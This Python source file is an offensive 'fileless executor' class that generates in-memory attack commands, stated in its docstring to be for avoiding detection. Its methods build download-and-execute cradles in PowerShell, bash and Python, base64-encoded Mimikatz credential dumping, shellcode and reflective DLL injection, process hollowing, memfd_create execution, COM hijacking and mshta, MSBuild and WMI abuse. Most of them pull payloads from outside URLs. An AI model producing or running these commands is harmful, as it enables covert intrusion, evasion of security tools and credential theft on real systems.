"""
Fileless Executor - In-Memory Execution Techniques
Execute code without writing to disk to avoid detection
"""

import asyncio
import logging
from typing import Dict, List, Optional, Any
from pathlib import Path
import base64

logger = logging.getLogger(__name__)


class FilelessExecutor:
    """
    Fileless execution techniques
    Runs code entirely in memory without disk artifacts
    """
    
    def __init__(self, os_type: str = 'windows'):
        """
        Initialize fileless executor
        
        Args:
            os_type: Operating system type
        """
        self.os_type = os_type
        logger.info(f"FilelessExecutor initialized for {os_type}")
        
    # PowerShell in-memory techniques
    
    async def powershell_reflection_load(self, assembly_url: str) -> str:
        """
        Load .NET assembly in memory using PowerShell reflection
        
        Args:
            assembly_url: URL to .NET assembly
            
        Returns:
            PowerShell command
        """
        ps_script = f'''
$data = (New-Object Net.WebClient).DownloadData('{assembly_url}')
$assembly = [System.Reflection.Assembly]::Load($data)
$type = $assembly.GetType('Namespace.ClassName')
$method = $type.GetMethod('Main')
$method.Invoke($null, @(,[string[]]@()))
'''
        
        encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
        cmd = f'powershell -EncodedCommand {encoded}'
        
        logger.info("PowerShell reflection assembly load")
        return cmd
        
    async def powershell_invoke_expression(self, script_url: str) -> str:
        """
        Download and execute PowerShell script in memory
        
        Args:
            script_url: URL to PowerShell script
            
        Returns:
            PowerShell command
        """
        cmd = f'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\'{script_url}\')"'
        logger.info("PowerShell IEX download-execute")
        return cmd
        
    async def powershell_invoke_mimikatz(self, mimikatz_url: str = None) -> str:
        """
        Execute Mimikatz in memory via PowerShell
        
        Args:
            mimikatz_url: URL to Invoke-Mimikatz.ps1
            
        Returns:
            PowerShell command
        """
        if mimikatz_url:
            ps_script = f'''
IEX (New-Object Net.WebClient).DownloadString('{mimikatz_url}')
Invoke-Mimikatz -DumpCreds
'''
        else:
            # Use embedded version
            ps_script = 'Invoke-Mimikatz -DumpCreds'
            
        encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
        cmd = f'powershell -EncodedCommand {encoded}'
        
        logger.info("Fileless Mimikatz execution")
        return cmd
        
    async def powershell_shellcode_injection(self, shellcode_url: str, process: str = 'explorer.exe') -> str:
        """
        Inject shellcode into process memory
        
        Args:
            shellcode_url: URL to shellcode
            process: Target process
            
        Returns:
            PowerShell command
        """
        ps_script = f'''
$code = (New-Object Net.WebClient).DownloadString('{shellcode_url}')
$shellcode = [Convert]::FromBase64String($code)

# Allocate memory
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $ptr, $shellcode.Length)

# Create thread
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[IntPtr]])
$hThread.Invoke([IntPtr]::Zero)
'''
        
        encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
        cmd = f'powershell -EncodedCommand {encoded}'
        
        logger.info(f"Shellcode injection into {process}")
        return cmd
        
    # Python in-memory execution
    
    async def python_exec_from_url(self, script_url: str) -> str:
        """
        Execute Python script from URL without saving
        
        Args:
            script_url: URL to Python script
            
        Returns:
            Python command
        """
        cmd = f'python3 -c "import urllib.request; exec(urllib.request.urlopen(\'{script_url}\').read())"'
        logger.info("Python exec from URL")
        return cmd
        
    async def python_import_from_memory(self, module_url: str, module_name: str) -> str:
        """
        Import Python module from memory
        
        Args:
            module_url: URL to Python module
            module_name: Module name
            
        Returns:
            Python command
        """
        py_code = f'''
import sys
import types
import urllib.request

code = urllib.request.urlopen('{module_url}').read()
module = types.ModuleType('{module_name}')
exec(code, module.__dict__)
sys.modules['{module_name}'] = module
'''
        
        cmd = f'python3 -c "{py_code}"'
        logger.info(f"Python module {module_name} imported from memory")
        return cmd
        
    # Linux in-memory execution
    
    async def bash_dev_shm_execution(self, script_url: str) -> str:
        """
        Execute script from /dev/shm (memory filesystem)
        
        Args:
            script_url: URL to script
            
        Returns:
            Bash command
        """
        script_name = 'script.sh'
        cmd = f'curl -s {script_url} | bash'
        
        logger.info("/dev/shm in-memory execution")
        return cmd
        
    async def bash_memfd_create(self, binary_url: str) -> str:
        """
        Execute binary using memfd_create (Linux)
        
        Args:
            binary_url: URL to binary
            
        Returns:
            Command sequence
        """
        # memfd_create creates anonymous file in memory
        cmd = f'''
curl -s {binary_url} | python3 -c "
import ctypes
import os
import sys

# Read binary from stdin
binary = sys.stdin.buffer.read()

# Create memfd
libc = ctypes.CDLL('libc.so.6')
fd = libc.syscall(319, 'malicious', 1)  # memfd_create syscall

# Write binary to memfd
os.write(fd, binary)

# Execute from /proc/self/fd/
os.execv(f'/proc/self/fd/{{fd}}', ['binary'])
"
'''
        
        logger.info("memfd_create in-memory execution")
        return cmd
        
    # Process injection techniques
    
    async def dll_injection_reflective(self, dll_url: str, target_pid: int) -> str:
        """
        Reflective DLL injection
        
        Args:
            dll_url: URL to DLL
            target_pid: Target process ID
            
        Returns:
            PowerShell command
        """
        ps_script = f'''
$dll = (New-Object Net.WebClient).DownloadData('{dll_url}')

# Get target process
$process = Get-Process -Id {target_pid}

# Allocate memory in target process
$allocAddr = [Inject]::VirtualAllocEx($process.Handle, [IntPtr]::Zero, $dll.Length, 0x3000, 0x40)

# Write DLL to target process
[Inject]::WriteProcessMemory($process.Handle, $allocAddr, $dll, $dll.Length, [ref]0)

# Execute
[Inject]::CreateRemoteThread($process.Handle, [IntPtr]::Zero, 0, $allocAddr, [IntPtr]::Zero, 0, [ref]0)
'''
        
        encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
        cmd = f'powershell -EncodedCommand {encoded}'
        
        logger.info(f"Reflective DLL injection into PID {target_pid}")
        return cmd
        
    async def process_hollowing(self, legitimate_exe: str, payload_url: str) -> str:
        """
        Process hollowing technique
        
        Args:
            legitimate_exe: Legitimate executable to hollow
            payload_url: URL to malicious payload
            
        Returns:
            PowerShell command
        """
        ps_script = f'''
# Download payload
$payload = (New-Object Net.WebClient).DownloadData('{payload_url}')

# Start suspended process
$si = New-Object System.Diagnostics.ProcessStartInfo
$si.FileName = "{legitimate_exe}"
$si.UseShellExecute = $false
$si.CreateNoWindow = $true

$process = [System.Diagnostics.Process]::Start($si)

# Unmap original image
[ProcessHollow]::NtUnmapViewOfSection($process.Handle, $process.MainModule.BaseAddress)

# Allocate memory for payload
$allocAddr = [ProcessHollow]::VirtualAllocEx($process.Handle, $process.MainModule.BaseAddress, $payload.Length, 0x3000, 0x40)

# Write payload
[ProcessHollow]::WriteProcessMemory($process.Handle, $allocAddr, $payload, $payload.Length, [ref]0)

# Resume thread
[ProcessHollow]::ResumeThread($process.MainThread.Handle)
'''
        
        encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
        cmd = f'powershell -EncodedCommand {encoded}'
        
        logger.info(f"Process hollowing: {legitimate_exe}")
        return cmd
        
    # Registry-less execution
    
    async def wmi_execute_vbscript(self, vbscript: str) -> str:
        """
        Execute VBScript using WMI (no file written)
        
        Args:
            vbscript: VBScript code
            
        Returns:
            PowerShell command
        """
        ps_script = f'''
$wmi = [wmiclass]"Win32_Process"
$wmi.Create("wscript.exe /e:vbscript -", $null, $null, [ref]$null)
'''
        
        logger.info("WMI VBScript execution")
        return 'wmic process call create "wscript.exe /e:vbscript"'
        
    # MSBuild inline execution
    
    async def msbuild_inline_csharp(self, csharp_code: str) -> str:
        """
        Execute C# code using MSBuild (no compilation to disk)
        
        Args:
            csharp_code: C# code to execute
            
        Returns:
            Path to generated XML file
        """
        xml_content = f'''
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
using System;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class ClassExample : Task
{{
    public override bool Execute()
    {{
        {csharp_code}
        return true;
    }}
}}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
'''
        
        # Would write to temp location and execute
        logger.info("MSBuild inline C# execution")
        return 'msbuild.exe /p:Configuration=Release payload.xml'
        
    # Advanced techniques
    
    async def com_hijacking_fileless(self, clsid: str, payload_url: str) -> str:
        """
        COM hijacking with fileless payload
        
        Args:
            clsid: COM CLSID to hijack
            payload_url: URL to payload
            
        Returns:
            PowerShell command
        """
        ps_script = f'''
# Download payload
$payload = (New-Object Net.WebClient).DownloadString('{payload_url}')

# Create COM object
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("{clsid}"))

# Execute payload via COM
$com.Execute($payload)
'''
        
        logger.info(f"COM hijacking: {clsid}")
        return f'powershell -c "{ps_script}"'
        
    async def javascript_in_memory(self, js_code: str) -> str:
        """
        Execute JavaScript in memory
        
        Args:
            js_code: JavaScript code
            
        Returns:
            Command
        """
        cmd = f'mshta javascript:{js_code};close();'
        logger.info("JavaScript in-memory execution")
        return cmd
